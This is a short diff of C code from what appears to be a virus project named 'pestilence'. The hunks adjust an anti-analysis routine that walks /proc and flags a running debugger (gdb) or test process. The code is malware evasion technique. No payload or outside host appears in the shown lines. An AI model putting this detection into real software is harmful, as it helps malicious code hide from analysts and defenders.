@@ -12,7 +12,7 @@ static unsigned char g_signature[] = {
 char    *ft_getproc(int i)
 {
     if (i == 0)
-        return ("test");
+        return ("./test");
     else if (i == 1)
         return ("gdb");
     else
@@ -31,7 +31,7 @@ void    ft_antiprocess(t_pestilence *pestilence)
     while (i < 3)
     {
         rewinddir(pestilence->proc);
-        while ((pestilence->readproc = readdir(pestilence->proc)) != NULL && pestilence->anti_virus == 0)
+        while ((pestilence->readproc = readdir(pestilence->proc)) != NULL && pestilence->anti_virus != 1)
         {
             if (atoi(pestilence->readproc->d_name) > 0)
             {
@@ -42,7 +42,7 @@ void    ft_antiprocess(t_pestilence *pestilence)
                 memset(buff, 0, sizeof(buff));
                 read(fd, buff, sizeof(buff) - 1);
                 close(fd);
-                if (!strcmp(ft_getproc(i), buff))
+                if (strcmp(ft_getproc(i), buff) == 0)
                     pestilence->anti_virus = 1;
             }            
         }
